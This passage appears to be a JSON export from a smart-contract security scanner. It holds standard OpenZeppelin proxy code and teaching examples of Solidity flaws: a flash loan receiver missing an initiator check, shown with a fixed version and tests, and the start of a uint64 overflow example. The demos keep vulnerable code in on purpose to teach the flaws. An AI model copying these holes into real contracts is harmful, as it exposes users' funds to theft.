`0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`\n     */\n    function implementation() external ifAdmin returns (address implementation_) {\n        implementation_ = _implementation();\n    }\n\n    /**\n     * @dev Changes the admin of the proxy.\n     *\n     * Emits an {AdminChanged} event.\n     *\n     * NOTE: Only the admin can call this function. See {ProxyAdmin-changeProxyAdmin}.\n     */\n    function changeAdmin(address newAdmin) external virtual ifAdmin {\n        _changeAdmin(newAdmin);\n    }\n\n    /**\n     * @dev Upgrade the implementation of the proxy.\n     *\n     * NOTE: Only the admin can call this function. See {ProxyAdmin-upgrade}.\n     */\n    function upgradeTo(address newImplementation) external ifAdmin {\n        _upgradeToAndCall(newImplementation, bytes(\"\"), false);\n    }\n\n    /**\n     * @dev Upgrade the implementation of the proxy, and then call a function from the new implementation as specified\n     * by `data`, which should be an encoded function call. This is useful to initialize new storage variables in the\n     * proxied contract.\n     *\n     * NOTE: Only the admin can call this function. See {ProxyAdmin-upgradeAndCall}.\n     */\n    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable ifAdmin {\n        _upgradeToAndCall(newImplementation, data, true);\n    }\n\n    /**\n     * @dev Returns the current admin.\n     */\n    function _admin() internal view virtual returns (address) {\n        return _getAdmin();\n    }\n\n    /**\n     * @dev Makes sure the admin cannot access the fallback function. See {Proxy-_beforeFallback}.\n     */\n    function _beforeFallback() internal virtual override {\n        require(msg.sender != _getAdmin(), \"TransparentUpgradeableProxy: admin cannot fallback to proxy target\");\n        super._beforeFallback();\n    }\n}\n\n\n// File: @openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"./TransparentUpgradeableProxy.sol\";\nimport \"../../access/Ownable.sol\";\n\n/**\n * @dev This is an auxiliary contract meant to be assigned as the admin of a {TransparentUpgradeableProxy}. For an\n * explanation of why you would want to use this see the documentation for {TransparentUpgradeableProxy}.\n */\ncontract ProxyAdmin is Ownable {\n\n    /**\n     * @dev Returns the current implementation of `proxy`.\n     *\n     * Requirements:\n     *\n     * - This contract must be the admin of `proxy`.\n     */\n    function getProxyImplementation(TransparentUpgradeableProxy proxy) public view virtual returns (address) {\n        // We need to manually run the static call since the getter cannot be flagged as view\n        // bytes4(keccak256(\"implementation()\")) == 0x5c60da1b\n        (bool success, bytes memory returndata) = address(proxy).staticcall(hex\"5c60da1b\");\n        require(success);\n        return abi.decode(returndata, (address));\n    }\n\n    /**\n     * @dev Returns the current admin of `proxy`.\n     *\n     * Requirements:\n     *\n     * - This contract must be the admin of `proxy`.\n     */\n    function getProxyAdmin(TransparentUpgradeableProxy proxy) public view virtual returns (address) {\n        // We need to manually run the static call since the getter cannot be flagged as view\n        // bytes4(keccak256(\"admin()\")) == 0xf851a440\n        (bool success, bytes memory returndata) = address(proxy).staticcall(hex\"f851a440\");\n        require(success);\n        return abi.decode(returndata, (address));\n    }\n\n    /**\n     * @dev Changes the admin of `proxy` to `newAdmin`.\n     *\n     * Requirements:\n     *\n     * - This contract must be the current admin of `proxy`.\n     */\n    function changeProxyAdmin(TransparentUpgradeableProxy proxy, address newAdmin) public virtual onlyOwner {\n        proxy.changeAdmin(newAdmin);\n    }\n\n    /**\n     * @dev Upgrades `proxy` to `implementation`. See {TransparentUpgradeableProxy-upgradeTo}.\n     *\n     * Requirements:\n     *\n     * - This contract must be the admin of `proxy`.\n     */\n    function upgrade(TransparentUpgradeableProxy proxy, address implementation) public virtual onlyOwner {\n        proxy.upgradeTo(implementation);\n    }\n\n    /**\n     * @dev Upgrades `proxy` to `implementation` and calls a function on the new implementation. See\n     * {TransparentUpgradeableProxy-upgradeToAndCall}.\n     *\n     * Requirements:\n     *\n     * - This contract must be the admin of `proxy`.\n     */\n    function upgradeAndCall(TransparentUpgradeableProxy proxy, address implementation, bytes memory data) public payable virtual onlyOwner {\n        proxy.upgradeToAndCall{value: msg.value}(implementation, data);\n    }\n}\n\n\n// File: @openzeppelin/contracts/proxy/beacon/IBeacon.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n/**\n * @dev This is the interface that {BeaconProxy} expects of its beacon.\n */\ninterface IBeacon {\n    /**\n     * @dev Must return an address that can be used as a delegate call target.\n     *\n     * {BeaconProxy} will check that this address is a contract.\n     */\n    function implementation() external view returns (address);\n}\n\n\n// File: @openzeppelin/contracts/proxy/Proxy.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n/**\n * @dev This abstract contract provides a fallback function that delegates all calls to another contract using the EVM\n * instruction `delegatecall`. We refer to the second contract as the _implementation_ behind the proxy, and it has to\n * be specified by overriding the virtual {_implementation} function.\n *\n * Additionally, delegation to the implementation can be triggered manually through the {_fallback} function, or to a\n * different contract through the {_delegate} function.\n *\n * The success and return data of the delegated call will be returned back to the caller of the proxy.\n */\nabstract contract Proxy {\n    /**\n     * @dev Delegates the current call to `implementation`.\n     *\n     * This function does not return to its internall call site, it will return directly to the external caller.\n     */\n    function _delegate(address implementation) internal virtual {\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            // Copy msg.data. We take full control of memory in this inline assembly\n            // block because it will not return to Solidity code. We overwrite the\n            // Solidity scratch pad at memory position 0.\n            calldatacopy(0, 0, calldatasize())\n\n            // Call the implementation.\n            // out and outsize are 0 because we don't know the size yet.\n            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)\n\n            // Copy the returned data.\n            returndatacopy(0, 0, returndatasize())\n\n            switch result\n            // delegatecall returns 0 on error.\n            case 0 { revert(0, returndatasize()) }\n            default { return(0, returndatasize()) }\n        }\n    }\n\n    /**\n     * @dev This is a virtual function that should be overriden so it returns the address to which the fallback function\n     * and {_fallback} should delegate.\n     */\n    function _implementation() internal view virtual returns (address);\n\n    /**\n     * @dev Delegates the current call to the address returned by `_implementation()`.\n     *\n     * This function does not return to its internall call site, it will return directly to the external caller.\n     */\n    function _fallback() internal virtual {\n        _beforeFallback();\n        _delegate(_implementation());\n    }\n\n    /**\n     * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if no other\n     * function in the contract matches the call data.\n     */\n    fallback () external payable virtual {\n        _fallback();\n    }\n\n    /**\n     * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if call data\n     * is empty.\n     */\n    receive () external payable virtual {\n        _fallback();\n    }\n\n    /**\n     * @dev Hook that is called before falling back to the implementation. Can happen as part of a manual `_fallback`\n     * call, or as part of the Solidity `fallback` or `receive` functions.\n     *\n     * If overriden should call `super._beforeFallback()`.\n     */\n    function _beforeFallback() internal virtual {\n    }\n}\n\n\n// File: @openzeppelin/contracts/proxy/ERC1967/ERC1967Upgrade.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\nimport \"../beacon/IBeacon.sol\";\nimport \"../../utils/Address.sol\";\nimport \"../../utils/StorageSlot.sol\";\n\n/**\n * @dev This abstract contract provides getters and event emitting update functions for\n * https://eips.ethereum.org/EIPS/eip-1967[EIP1967] slots.\n *\n * _Available since v4.1._\n *\n * @custom:oz-upgrades-unsafe-allow delegatecall\n */\nabstract contract ERC1967Upgrade {\n    // This is the keccak-256 hash of \"eip1967.proxy.rollback\" subtracted by 1\n    bytes32 private constant _ROLLBACK_SLOT = 0x4910fdfa16fed3260ed0e7147f7cc6da11a60208b5b9406d12a635614ffd9143;\n\n    /**\n     * @dev Storage slot with the address of the current implementation.\n     * This is the keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1, and is\n     * validated in the constructor.\n     */\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    /**\n     * @dev Emitted when the implementation is upgraded.\n     */\n    event Upgraded(address indexed implementation);\n\n    /**\n     * @dev Returns the current implementation address.\n     */\n    function _getImplementation() internal view returns (address) {\n        return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;\n    }\n\n    /**\n     * @dev Stores a new address in the EIP1967 implementation slot.\n     */\n    function _setImplementation(address newImplementation) private {\n        require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\n        StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation;\n    }\n\n    /**\n     * @dev Perform implementation upgrade\n     *\n     * Emits an {Upgraded} event.\n     */\n    function _upgradeTo(address newImplementation) internal {\n        _setImplementation(newImplementation);\n        emit Upgraded(newImplementation);\n    }\n\n    /**\n     * @dev Perform implementation upgrade with additional setup call.\n     *\n     * Emits an {Upgraded} event.\n     */\n    function _upgradeToAndCall(address newImplementation, bytes memory data, bool forceCall) internal {\n        _setImplementation(newImplementation);\n        emit Upgraded(newImplementation);\n        if (data.length > 0 || forceCall) {\n            Address.functionDelegateCall(newImplementation, data);\n        }\n    }\n\n    /**\n     * @dev Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.\n     *\n     * Emits an {Upgraded} event.\n     */\n    function _upgradeToAndCallSecure(address newImplementation, bytes memory data, bool forceCall) internal {\n        address oldImplementation = _getImplementation();\n\n        // Initial upgrade and setup call\n        _setImplementation(newImplementation);\n        if (data.length > 0 || forceCall) {\n            Address.functionDelegateCall(newImplementation, data);\n        }\n\n        // Perform rollback test if not already in progress\n        StorageSlot.BooleanSlot storage rollbackTesting = StorageSlot.getBooleanSlot(_ROLLBACK_SLOT);\n        if (!rollbackTesting.value) {\n            // Trigger rollback using upgradeTo from the new implementation\n            rollbackTesting.value = true;\n            Address.functionDelegateCall(\n                newImplementation,\n                abi.encodeWithSignature(\n                    \"upgradeTo(address)\",\n                    oldImplementation\n                )\n            );\n            rollbackTesting.value = false;\n            // Check rollback was effective\n            require(oldImplementation == _getImplementation(), \"ERC1967Upgrade: upgrade breaks further upgrades\");\n            // Finally reset to the new implementation and log the upgrade\n            _setImplementation(newImplementation);\n            emit Upgraded(newImplementation);\n        }\n    }\n\n    /**\n     * @dev Perform beacon upgrade with additional setup call. Note: This upgrades the address of the beacon, it does\n     * not upgrade the implementation contained in the beacon (see {UpgradeableBeacon-_setImplementation} for that).\n     *\n     * Emits a {BeaconUpgraded} event.\n     */\n    function _upgradeBeaconToAndCall(address newBeacon, bytes memory data, bool forceCall) internal {\n        _setBeacon(newBeacon);\n        emit BeaconUpgraded(newBeacon);\n        if (data.length > 0 || forceCall) {\n            Address.functionDelegateCall(IBeacon(newBeacon).implementation(), data);\n        }\n    }\n\n    /**\n     * @dev Storage slot with the admin of the contract.\n     * This is the keccak-256 hash of \"eip1967.proxy.admin\" subtracted by 1, and is\n     * validated in the constructor.\n     */\n    bytes32 internal constant _ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;\n\n    /**\n     * @dev Emitted when the admin account has changed.\n     */\n    event AdminChanged(address previousAdmin, address newAdmin);\n\n    /**\n     * @dev Returns the current admin.\n     */\n    function _getAdmin() internal view returns (address) {\n        return StorageSlot.getAddressSlot(_ADMIN_SLOT).value;\n    }\n\n    /**\n     * @dev Stores a new address in the EIP1967 admin slot.\n     */\n    function _setAdmin(address newAdmin) private {\n        require(newAdmin != address(0), \"ERC1967: new admin is the zero address\");\n        StorageSlot.getAddressSlot(_ADMIN_SLOT).value = newAdmin;\n    }\n\n    /**\n     * @dev Changes the admin of the proxy.\n     *\n     * Emits an {AdminChanged} event.\n     */\n    function _changeAdmin(address newAdmin) internal {\n        emit AdminChanged(_getAdmin(), newAdmin);\n        _setAdmin(newAdmin);\n    }\n\n    /**\n     * @dev The storage slot of the UpgradeableBeacon contract which defines the implementation for this proxy.\n     * This is bytes32(uint256(keccak256('eip1967.proxy.beacon')) - 1)) and is validated in the constructor.\n     */\n    bytes32 internal constant _BEACON_SLOT = 0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50;\n\n    /**\n     * @dev Emitted when the beacon is upgraded.\n     */\n    event BeaconUpgraded(address indexed beacon);\n\n    /**\n     * @dev Returns the current beacon.\n     */\n    function _getBeacon() internal view returns (address) {\n        return StorageSlot.getAddressSlot(_BEACON_SLOT).value;\n    }\n\n    /**\n     * @dev Stores a new beacon in the EIP1967 beacon slot.\n     */\n    function _setBeacon(address newBeacon) private {\n        require(\n            Address.isContract(newBeacon),\n            \"ERC1967: new beacon is not a contract\"\n        );\n        require(\n            Address.isContract(IBeacon(newBeacon).implementation()),\n            \"ERC1967: beacon implementation is not a contract\"\n        );\n        StorageSlot.getAddressSlot(_BEACON_SLOT).value = newBeacon;\n    }\n}\n\n\n// File: @openzeppelin/contracts/utils/Address.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address {\n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     * ====\n     */\n    function isContract(address account) internal view returns (bool) {\n        // This method relies on extcodesize, which returns 0 for contracts in\n        // construction, since the code is only stored at the end of the\n        // constructor execution.\n\n        uint256 size;\n        // solhint-disable-next-line no-inline-assembly\n        assembly { size := extcodesize(account) }\n        return size > 0;\n    }\n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. {sendValue} removes this limitation.\n     *\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     * {ReentrancyGuard} or the\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue(address payable recipient, uint256 amount) internal {\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\n\n        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\n        (bool success, ) = recipient.call{ value: amount }(\"\");\n        require(success, \"Address: unable to send value, recipient may have reverted\");\n    }\n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain`call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function (like regular Solidity function calls).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n      return functionCall(target, data, \"Address: low-level call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, 0, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\n        require(isContract(target), \"Address: call to non-contract\");\n\n        // solhint-disable-next-line avoid-low-level-calls\n        (bool success, bytes memory returndata) = target.call{ value: value }(data);\n        return _verifyCallResult(success, returndata, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\n        return functionStaticCall(target, data, \"Address: low-level static call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {\n        require(isContract(target), \"Address: static call to non-contract\");\n\n        // solhint-disable-next-line avoid-low-level-calls\n        (bool success, bytes memory returndata) = target.staticcall(data);\n        return _verifyCallResult(success, returndata, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n        require(isContract(target), \"Address: delegate call to non-contract\");\n\n        // solhint-disable-next-line avoid-low-level-calls\n        (bool success, bytes memory returndata) = target.delegatecall(data);\n        return _verifyCallResult(success, returndata, errorMessage);\n    }\n\n    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {\n        if (success) {\n            return returndata;\n        } else {\n            // Look for revert reason and bubble it up if present\n            if (returndata.length > 0) {\n                // The easiest way to bubble the revert reason is using memory via assembly\n\n                // solhint-disable-next-line no-inline-assembly\n                assembly {\n                    let returndata_size := mload(returndata)\n                    revert(add(32, returndata), returndata_size)\n                }\n            } else {\n                revert(errorMessage);\n            }\n        }\n    }\n}\n\n\n// File: @openzeppelin/contracts/utils/StorageSlot.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Library for reading and writing primitive types to specific storage slots.\n *\n * Storage slots are often used to avoid storage conflict when dealing with upgradeable contracts.\n * This library helps with reading and writing to such slots without the need for inline assembly.\n *\n * The functions in this library return Slot structs that contain a `value` member that can be used to read or write.\n *\n * Example usage to set ERC1967 implementation slot:\n * ```\n * contract ERC1967 {\n *     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n *\n *     function _getImplementation() internal view returns (address) {\n *         return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;\n *     }\n *\n *     function _setImplementation(address newImplementation) internal {\n *         require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\n *         StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation;\n *     }\n * }\n * ```\n *\n * _Available since v4.1 for `address`, `bool`, `bytes32`, and `uint256`._\n */\nlibrary StorageSlot {\n    struct AddressSlot {\n        address value;\n    }\n\n    struct BooleanSlot {\n        bool value;\n    }\n\n    struct Bytes32Slot {\n        bytes32 value;\n    }\n\n    struct Uint256Slot {\n        uint256 value;\n    }\n\n    /**\n     * @dev Returns an `AddressSlot` with member `value` located at `slot`.\n     */\n    function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {\n        assembly {\n            r.slot := slot\n        }\n    }\n\n    /**\n     * @dev Returns an `BooleanSlot` with member `value` located at `slot`.\n     */\n    function getBooleanSlot(bytes32 slot) internal pure returns (BooleanSlot storage r) {\n        assembly {\n            r.slot := slot\n        }\n    }\n\n    /**\n     * @dev Returns an `Bytes32Slot` with member `value` located at `slot`.\n     */\n    function getBytes32Slot(bytes32 slot) internal pure returns (Bytes32Slot storage r) {\n        assembly {\n            r.slot := slot\n        }\n    }\n\n    /**\n     * @dev Returns an `Uint256Slot` with member `value` located at `slot`.\n     */\n    function getUint256Slot(bytes32 slot) internal pure returns (Uint256Slot storage r) {\n        assembly {\n            r.slot := slot\n        }\n    }\n}\n\n\n// File: @openzeppelin/contracts/access/Ownable.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"../utils/Context.sol\";\n/**\n * @dev Contract module which provides a basic access control mechanism, where\n * there is an account (an owner) that can be granted exclusive access to\n * specific functions.\n *\n * By default, the owner account will be the one that deploys the contract. This\n * can later be changed with {transferOwnership}.\n *\n * This module is used through inheritance. It will make available the modifier\n * `onlyOwner`, which can be applied to your functions to restrict their use to\n * the owner.\n */\nabstract contract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor () {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby removing any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n}\n\n\n// File: @openzeppelin/contracts/utils/Context.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n/*\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n        return msg.data;\n    }\n}\n","contract_language":"solidity","status":"pending","created_at":"2025-08-30T16:37:44.444Z","completed_at":null,"user_id":null,"contract_source":"live-scan","github_repo_id":null,"github_file_path":null,"is_public":true,"public_title":"Live Scan: ERC1967Proxy","public_description":"Automated security analysis of ERC1967Proxy contract from ethereum network","tags":["live-scan","ethereum","unknown"],"credits_used":0,"code_complexity":1,"is_pinned":false,"is_archived":false},{"id":"3b6e6ce4-0c9f-4a40-a6d0-8288d5865ddc","session_key":"54f7e6f1-9f3f-464b-ae87-31bce8af70ab","contract_code":"// File: Flashloan-flaw.sol\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n/*\nName: Missing flash loan initiator check\n\nDescription:\nMissing flash loan initiator check refers to a potential security vulnerability in a flash loan implementation \nwhere the initiator of the flash loan is not properly verified or checked, anyone could exploit the flash loan \nfunctionality and set the receiver address to a vulnerable protocol.\n  \nBy doing so, an attacker could potentially manipulate balances, open trades, drain funds, \nor carry out other malicious actions within the vulnerable protocol. \nThis poses significant risks to the security and integrity of the protocol and its users.\n\nMitigation:  \nCheck the initiator of the flash loan and revert if the initiator is not authorized.\n\nREF:\nhttps://twitter.com/ret2basic/status/1681150722434551809\nhttps://github.com/sherlock-audit/2023-05-dodo-judging/issues/34\n*/\n\ncontract ContractTest is Test {\n    USDa USDaContract;\n    LendingPool LendingPoolContract;\n    SimpleBankBug SimpleBankBugContract;\n    FixedSimpleBank FixedSimpleBankContract;\n\n    function setUp() public {\n        USDaContract = new USDa();\n        LendingPoolContract = new LendingPool(address(USDaContract));\n        SimpleBankBugContract = new SimpleBankBug(\n            address(LendingPoolContract),\n            address(USDaContract)\n        );\n        USDaContract.transfer(address(LendingPoolContract), 10000 ether);\n        FixedSimpleBankContract = new FixedSimpleBank(\n            address(LendingPoolContract),\n            address(USDaContract)\n        );\n    }\n\n    function testFlashLoanFlaw() public {\n        LendingPoolContract.flashLoan(\n            500 ether,\n            address(SimpleBankBugContract),\n            \"0x0\"\n        );\n    }\n\n    function testFlashLoanSecure() public {\n        vm.expectRevert(\"Unauthorized\");\n        LendingPoolContract.flashLoan(\n            500 ether,\n            address(FixedSimpleBankContract),\n            \"0x0\"\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract SimpleBankBug {\n    using SafeERC20 for IERC20;\n    IERC20 public USDa;\n    LendingPool public lendingPool;\n\n    constructor(address _lendingPoolAddress, address _asset) {\n        lendingPool = LendingPool(_lendingPoolAddress);\n        USDa = IERC20(_asset);\n    }\n\n    function flashLoan(\n        uint256 amounts,\n        address receiverAddress,\n        bytes calldata data\n    ) external {\n        receiverAddress = address(this);\n\n        lendingPool.flashLoan(amounts, receiverAddress, data);\n    }\n\n    function executeOperation(\n        uint256 amounts,\n        address receiverAddress,\n        address _initiator,\n        bytes calldata data\n    ) external {\n        /* Perform your desired logic here\n        Open opsition, close opsition, drain funds, etc.\n        _closetrade(...) or _opentrade(...)\n        */\n\n        // transfer all borrowed assets back to the lending pool\n        IERC20(USDa).safeTransfer(address(lendingPool), amounts);\n    }\n}\n\ncontract FixedSimpleBank {\n    using SafeERC20 for IERC20;\n    IERC20 public USDa;\n    LendingPool public lendingPool;\n\n    constructor(address _lendingPoolAddress, address _asset) {\n        lendingPool = LendingPool(_lendingPoolAddress);\n        USDa = IERC20(_asset);\n    }\n\n    function flashLoan(\n        uint256 amounts,\n        address receiverAddress,\n        bytes calldata data\n    ) external {\n        address receiverAddress = address(this);\n\n        lendingPool.flashLoan(amounts, receiverAddress, data);\n    }\n\n    function executeOperation(\n        uint256 amounts,\n        address receiverAddress,\n        address _initiator,\n        bytes calldata data\n    ) external {\n        // Mitigation: make sure to check the initiator\n        require(_initiator == address(this), \"Unauthorized\");\n\n        // transfer all borrowed assets back to the lending pool\n        IERC20(USDa).safeTransfer(address(lendingPool), amounts);\n    }\n}\n\ncontract USDa is ERC20, Ownable {\n    constructor() ERC20(\"USDA\", \"USDA\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\ninterface IFlashLoanReceiver {\n    function executeOperation(\n        uint256 amounts,\n        address receiverAddress,\n        address _initiator,\n        bytes calldata data\n    ) external;\n}\n\ncontract LendingPool {\n    IERC20 public USDa;\n\n    constructor(address _USDA) {\n        USDa = IERC20(_USDA);\n    }\n\n    function flashLoan(\n        uint256 amount,\n        address borrower,\n        bytes calldata data\n    ) public {\n        uint256 balanceBefore = USDa.balanceOf(address(this));\n        require(balanceBefore >= amount, \"Not enough liquidity\");\n        require(USDa.transfer(borrower, amount), \"Flashloan transfer failed\");\n        IFlashLoanReceiver(borrower).executeOperation(\n            amount,\n            borrower,\n            msg.sender,\n            data\n        );\n\n        uint256 balanceAfter = USDa.balanceOf(address(this));\n        require(balanceAfter >= balanceBefore, \"Flashloan not repaid\");\n    }\n}\n","contract_language":"solidity","status":"completed","created_at":"2025-08-28T07:21:46.933Z","completed_at":"2025-08-28T07:23:39.518Z","user_id":"126b470c-625b-4074-913b-92b0edb9d452","contract_source":"manual","github_repo_id":null,"github_file_path":null,"is_public":false,"public_title":"test12","public_description":null,"tags":[],"credits_used":0,"code_complexity":1,"is_pinned":true,"is_archived":false},{"id":"45adee08-5b95-453e-9c50-18632115724c","session_key":"51ca7f81-95fe-45bf-bf53-619d65956be2","contract_code":"// SPDX-License-Identifier: MIT\npragma solidity ^0.7.0;\n// this need to be older version of solidity from 0.8.0 solidty compiler checks for overflow and underflow\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Invariant issue\n\nDescription:\nAssert is used to check invariants. Those are states our contract or variables should never reach, ever. For example,\nif we decrease a value then it should never get bigger, only smaller.\n\nIn the given code, the Invariant contract contains a receiveMoney function that accepts Ether and \nincrements the sender's balance with the amount received. This balance is stored as an uint64.\nUnsigned integers can store values from 0 to 2^n - 1, so in this case 2^64 - 1, or roughly 18.4467 Ether.\n\nIf the sender sends more Ether than the maximum that can be stored in an uint64, \nan overflow occurs, and the value rolls over to 0 and starts incrementing from there. \nAs a result, the balance does not accurately reflect the amount of Ether received by the contract.\n\nMitigation:\nTo avoid this problem, it's important to ensure that the types you use for storing values \nare appropriately sized for the values they need to store.\n\nREF:\nhttps://ethereum-blockchain-developer.com/027-exceptions/04-invariants-with-assert/\n\n*/\n\n\ncontract ContractTest is 